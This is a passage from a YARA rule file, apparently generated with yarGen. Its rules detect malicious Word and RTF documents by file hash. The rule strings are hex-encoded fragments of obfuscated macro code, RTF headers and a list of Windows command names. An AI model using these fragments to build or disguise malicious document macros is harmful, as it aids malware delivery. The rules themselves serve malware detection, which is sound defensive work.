      $s12 = "0046}#" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_12 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
   strings:
      $s1 = "33342A283334363337383533342D333436333734292B343833" ascii /* hex encoded string '34*(346378534-346374)+483' */
      $s2 = "6E667237203D202239333933393537333734332A3334333634" ascii /* hex encoded string 'nfr7 = "93939573743*34364' */
      $s3 = "36343633342B353633343635342D333938333635362F323734" ascii /* hex encoded string '64634+5634654-3983656/274' */
      $s4 = "36373538393635343635342B3433343333372A343536333435" ascii /* hex encoded string '67589654654+434337*456345' */
      $s5 = "3633342B353633343635342D333938333635362F3237343637" ascii /* hex encoded string '634+5634654-3983656/27467' */
      $s6 = "66626E667237203D202239333933393537333734332A333433" ascii /* hex encoded string 'fbnfr7 = "93939573743*343' */
      $s7 = "2A283334363337383533342D333436333734292B3438333435" ascii /* hex encoded string '*(346378534-346374)+48345' */
      $s8 = "37353476623478666736797879676279753637726667696267" ascii /* hex encoded string '754vb4xfg6yxygbyu67rfgibg' */
      $s9 = "3538393635343635342B3433343333372A3435363334353334" ascii /* hex encoded string '589654654+434337*45634534' */
      $s10 = "34766234786667367978796762797536377266676962676662" ascii /* hex encoded string '4vb4xfg6yxygbyu67rfgibgfb' */
      $s11 = "34292B3438333435220D0A2020202074363736667474663735" ascii
      $s12 = "0D0A64666764666764666764203D2064666764666764666764" ascii
      $s13 = "333734292B3438333435220D0A202020207436373666747466" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead_13 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
   strings:
      $s1 = "38333635362F32373436373538393635343635342B34333433" ascii /* hex encoded string '83656/27467589654654+4343' */
      $s2 = "37333734332A33343336343633342B353633343635342D3339" ascii /* hex encoded string '73743*34364634+5634654-39' */
      $s3 = "75363772666769626766626E667237203D2022393339333935" ascii /* hex encoded string 'u67rfgibgfbnfr7 = "939395' */
      $s4 = "6C617573667963686B73203D2077736C617573667963686B73" ascii /* hex encoded string 'lausfychks = wslausfychks' */
      $s5 = "33372A34353633343533342A283334363337383533342D3334" ascii /* hex encoded string '37*45634534*(346378534-34' */
      $s6 = "220D0A77736C617573667963686B73203D2077736C61757366" ascii
      $s7 = "C38DC592C38DC592C38DC592C38DC592C38DC592C38DC59220" ascii
      $s8 = "0D0A202020202020202020202020697672656A6B203D206976" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625_7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f_14 {
   meta:
      description = "DOC - from files 8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625.docx, 7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a.docx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "8e7fb6e2f5cab40baf71083b4406f993d482e945117f146efc9b2aeeb7772625"
      hash2 = "7dd7fcb839e3d18745b8dfd20dc6ef4f0fd6bad46597b10ec7649a2f7f364d0a"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide
      $s2 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide
      $s3 = "unction " fullword ascii
      $s4 = "Document=ThisDocumeP" fullword ascii
      $s5 = "Module1b" fullword ascii
      $s6 = "nt/&H00000000" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_15 {
   meta:
      description = "DOC - from files 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "202239333933393537333734332A33343336343633342B3536" ascii /* hex encoded string ' "93939573743*34364634+56' */
      $s2 = "667364663772656967203D206B6A7373647975667364663772" ascii /* hex encoded string 'fsdf7reig = kjssdyufsdf7r' */
      $s3 = "7573667963686B73203D2077736C617573667963686B73202B" ascii /* hex encoded string 'usfychks = wslausfychks +' */
      $s4 = "3635342B3433343333372A34353633343533342A2833343633" ascii /* hex encoded string '654+434337*45634534*(3463' */
      $s5 = "33343635342D333938333635362F3237343637353839363534" ascii /* hex encoded string '34654-3983656/27467589654' */
      $s6 = "673679787967627975363772666769626766626E667237203D" ascii /* hex encoded string 'g6yxygbyu67rfgibgfbnfr7 =' */
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_16 {
   meta:
      description = "DOC - from files 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "756C6B79746A747268746A726B647361726A6B79203D226257" ascii /* hex encoded string 'ulkytjtrhtjrkdsarjky ="bW' */
      $s2 = "202020202020202020202020697672656A6B203D2069767265" ascii /* hex encoded string '            ivrejk = ivre' */
      $s3 = "{\\rtf\\Fbidi \\froman\\fcharset238\\ud1\\adeff31507\\deff0\\stshfdbch31506\\stshfloch31506\\ztahffick41c05\\stshfBi31507\\deEfl" ascii
      $s4 = "adeff31507" ascii
      $s5 = "langfe1045\\themelang1045\\themelangfe1\\themelangcs5{\\lsdlockedexcept \\lsdqformat2 \\lsdpriority0 \\lsdlocked0 Normal;\\b865c" ascii
      $s6 = "{\\rtf\\Fbidi \\froman\\fcharset238\\ud1\\adeff31507\\deff0\\stshfdbch31506\\stshfloch31506\\ztahffick41c05\\stshfBi31507\\deEfl" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_17 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "7967627975363772666769626766626E667237203D20223933" ascii /* hex encoded string 'ygbyu67rfgibgfbnfr7 = "93' */
      $s2 = "3933393537333734332A33343336343633342B353633343635" ascii /* hex encoded string '939573743*34364634+563465' */
      $s3 = "2020202020202020697672656A6B203D20697672656A6B202B" ascii /* hex encoded string '        ivrejk = ivrejk +' */
      $s4 = "3433343333372A34353633343533342A283334363337383533" ascii /* hex encoded string '434337*45634534*(34637853' */
      $s5 = "342D333938333635362F32373436373538393635343635342B" ascii /* hex encoded string '4-3983656/27467589654654+' */
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_18 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash3 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash4 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "2B3433343333372A34353633343533342A2833343633373835" ascii /* hex encoded string '+434337*45634534*(3463785' */
      $s2 = "787967627975363772666769626766626E667237203D202239" ascii /* hex encoded string 'xygbyu67rfgibgfbnfr7 = "9' */
      $s3 = "333933393537333734332A33343336343633342B3536333436" ascii /* hex encoded string '3939573743*34364634+56346' */
      $s4 = "35342D333938333635362F3237343637353839363534363534" ascii /* hex encoded string '54-3983656/27467589654654' */
      $s5 = "0D0A2020202074363736667474663735347662347866673679" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_19 {
   meta:
      description = "DOC - from files 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
   strings:
      $s1 = "43414C204654595045204D4B4C494E4B20504F504420505553" ascii /* hex encoded string 'CAL FTYPE MKLINK POPD PUS' */
      $s2 = "20202020203D20224153534F4320434F4C4F5220454E444C4F" ascii /* hex encoded string '     = "ASSOC COLOR ENDLO' */
      $s3 = "0A202020202020202020202020657865637574652822626161" ascii
      $s4 = "4B2043414C4C204344204348220D0A434F4E535420494E5445" ascii
      $s5 = "4844205345544C4F43414C205354415254205449544C45220D" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_20 {
   meta:
      description = "DOC - from files e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash2 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash3 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "7237203D202239333933393537333734332A33343336343633" ascii /* hex encoded string 'r7 = "93939573743*3436463' */
      $s2 = "62347866673679787967627975363772666769626766626E66" ascii /* hex encoded string 'b4xfg6yxygbyu67rfgibgfbnf' */
      $s3 = "342B353633343635342D333938333635362F32373436373538" ascii /* hex encoded string '4+5634654-3983656/2746758' */
      $s4 = "393635343635342B3433343333372A34353633343533342A28" ascii /* hex encoded string '9654654+434337*45634534*(' */
      $s5 = "3334363337383533342D333436333734292B3438333435220D" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33_455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd1_21 {
   meta:
      description = "DOC - from files e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash2 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "53534F4320434F4C4F5220454E444C4F43414C204654595045" ascii /* hex encoded string 'SSOC COLOR ENDLOCAL FTYPE' */
      $s2 = "204D4B4C494E4B20504F5044205055534844205345544C4F43" ascii /* hex encoded string ' MKLINK POPD PUSHD SETLOC' */
      $s3 = "4D4F4E2020202020203D2022425245414B2043414C4C204344" ascii /* hex encoded string 'MON      = "BREAK CALL CD' */
      $s4 = "414C205354415254205449544C45220D0A434F4E535420494E" ascii
      $s5 = "204348220D0A434F4E535420494E5445524E414C5F434D445F" ascii
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

